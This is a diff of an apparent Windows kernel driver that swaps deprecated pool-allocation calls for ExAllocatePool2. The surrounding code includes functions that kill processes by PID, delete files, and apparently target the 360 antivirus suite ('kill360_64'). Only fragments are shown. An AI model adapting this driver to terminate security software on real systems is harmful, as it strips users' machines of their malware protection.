@@ -69,7 +69,7 @@ CHAR xKill2(DWORD32 dwPid) {
 		return KC_OPEN_FAILED;
 	}
 
-	PKAPC_STATE papcs = (PKAPC_STATE)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC_STATE), 'xmrl');
+	PKAPC_STATE papcs = (PKAPC_STATE)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC_STATE), 'xmrl');
 	if (papcs == NULL) {
 		xLog("K2 Open fail 2");
 		ObDereferenceObject(proc);
@@ -106,7 +106,7 @@ CHAR xKill2(DWORD32 dwPid) {
 		return KC_TERMINATE_FAILED;
 	}
 	KeDetachProcess();
-	PCHAR lt = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, 128, '6666');
+	PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 128, '6666');
 	if (lt != NULL) {
 		memset(lt, 0, 128);
 		RtlStringCbPrintfA(lt, 128, "K2 Info PID: %ld", dwPid);
@@ -122,7 +122,7 @@ CHAR xDel1(PCSTR userPath) {
 	//delete a single file/empty dir
 	//TEXT(path)
 	//return DC_SUCCESS;
-	PCHAR lt = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, 1024, '6666');
+	PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6666');
 	if (lt == NULL) return DC_OPEN_FAILED;
 	RtlStringCbPrintfA(lt, 1024, "\\??\\%s", userPath);
 
@@ -251,7 +251,7 @@ NTSTATUS kill360_64()
 	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, PMemory, length, &length);
 	if (NT_SUCCESS(systeminformation))
 	{
-		PCHAR lt = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, 1024, '6665');
+		PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6665');
 		process = (PSYSTEM_PROCESSES)PMemory;
 		if (process->ProcessId == 0)
 			DbgPrint("PID 0 System\n");
@@ -315,7 +315,7 @@ NTSTATUS tasklist_user(PCHAR buff, size_t buffLength)
 	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, PMemory, length, &length);
 	if (NT_SUCCESS(systeminformation))
 	{
-		PCHAR lt = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, 1024, '6665');
+		PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6665');
 		process = (PSYSTEM_PROCESSES)PMemory;
 		if (process->ProcessId == 0)
 			DbgPrint("PID 0 System\n");
